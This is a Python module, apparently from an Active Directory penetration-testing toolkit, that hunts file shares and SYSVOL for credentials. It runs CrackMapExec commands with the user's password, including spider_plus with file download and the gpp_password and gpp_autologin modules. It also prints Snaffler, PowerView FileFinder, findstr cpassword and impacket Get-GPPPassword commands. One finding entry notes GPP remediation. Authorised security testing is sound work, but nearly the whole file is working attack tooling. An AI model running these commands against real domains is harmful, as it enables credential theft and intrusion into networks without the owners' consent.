"""
Module: File & Share Hunter
Techniques: Snaffler, PowerView ShareFinder/FileFinder,
            CME spider_plus, SYSVOL/GPP cred search
"""
from utils.helpers import *
from config.settings import SESSION

def run():
    print_banner("FILE & SHARE HUNTER", "Snaffler / SYSVOL / Sensitive Files")
    dc   = input_or_session("dc_ip",    "DC IP")
    dom  = input_or_session("domain",   "Domain")
    user = input_or_session("username", "Username")
    pw   = input_or_session("password", "Password")
    base_dn = "DC=" + dom.replace(".", ",DC=")

    print(f"""
  [1]  Snaffler — Full domain share snaffle
  [2]  Invoke-ShareFinder (PowerView / CME)
  [3]  Invoke-FileFinder  (keyword search)
  [4]  CrackMapExec Spider+
  [5]  Get all file servers
  [6]  SYSVOL — Search for GPP / cpassword credentials
  [0]  Back
""")
    c = input(f"  {M}Choice:{RST} ").strip()

    if c == "1":
        outfile = prompt("Output log file") or "/tmp/snaffler.log"
        print(f"""
  {Y}Snaffler — run on Windows domain-joined machine:{RST}

  # Full domain — log + print to screen
  .\\Snaffler.exe -d {dom} -c {dc} -s -o {outfile}

  # Log file only (quieter)
  .\\Snaffler.exe -d {dom} -c {dc} -o {outfile}

  # Specific computers only
  .\\Snaffler.exe -n computer1,computer2 -s

  # Specific local directory
  .\\Snaffler.exe -i C:\\ -s

  # Run from Linux via proxychains
  proxychains .\\Snaffler.exe -d {dom} -c {dc} -s
""")

    elif c == "2":
        run_cmd(f"crackmapexec smb {dc} -u '{user}' -p '{pw}' --shares -d {dom}")
        print(f"""
  {Y}PowerView (Windows):{RST}
  Import-Module .\\PowerView.ps1
  Invoke-ShareFinder -Verbose
  Invoke-ShareFinder -CheckShareAccess     # only accessible shares
  Invoke-ShareFinder -ExcludeStandard      # skip SYSVOL/NETLOGON/IPC$
""")

    elif c == "3":
        keywords = prompt("Keywords (comma-separated)") or "pass,cred,secret,key,token,api"
        print(f"""
  {Y}PowerView FileFinder:{RST}
  Import-Module .\\PowerView.ps1
""")
        for kw in keywords.split(","):
            print(f'  Invoke-FileFinder -Verbose -Include "*{kw.strip()}*"')
        print(f"""
  {Y}CrackMapExec with regex pattern:{RST}
  crackmapexec smb {dc} -u '{user}' -p '{pw}' -M spider_plus -o PATTERN='{keywords.split(",")[0].strip()}'
""")

    elif c == "4":
        info("Spidering all accessible shares with CME:")
        run_cmd(f"crackmapexec smb {dc} -u '{user}' -p '{pw}' -M spider_plus")
        info("Results stored in /tmp/cme_spider_plus/ (JSON per host)")
        print(f"""
  {Y}Download interesting files:{RST}
  crackmapexec smb {dc} -u '{user}' -p '{pw}' -M spider_plus -o DOWNLOAD_FLAG=True
""")

    elif c == "5":
        run_cmd(f"ldapsearch -x -H ldap://{dc} -D '{user}@{dom}' -w '{pw}' -b '{base_dn}' '(objectClass=volume)' cn")
        info("PowerView: Get-NetFileServer -Verbose")
        run_cmd(f"crackmapexec smb {dc} -u '{user}' -p '{pw}' -d {dom} --users | grep 'homeDirectory\\|scriptPath\\|profilePath'")

    elif c == "6":
        info("GPP / cpassword search via CrackMapExec:")
        run_cmd(f"crackmapexec smb {dc} -u '{user}' -p '{pw}' -M gpp_password")
        run_cmd(f"crackmapexec smb {dc} -u '{user}' -p '{pw}' -M gpp_autologin")
        info("Manual SYSVOL search (Windows):")
        print(f"""
  {Y}cmd.exe:{RST}
  findstr /S /I cpassword \\\\{dom}\\sysvol\\{dom}\\policies\\*.xml

  {Y}PowerView:{RST}
  Get-GPPPassword -Verbose

  {Y}From Linux:{RST}
  impacket-Get-GPPPassword '{dom}/{user}:{pw}@{dc}'
""")
        add_finding("SYSVOL GPP Credential Search", "High",
                    "Searched SYSVOL for cpassword in Group Policy Preferences",
                    "Remove all GPP passwords; apply KB2962486 to prevent future storage")

    pause()
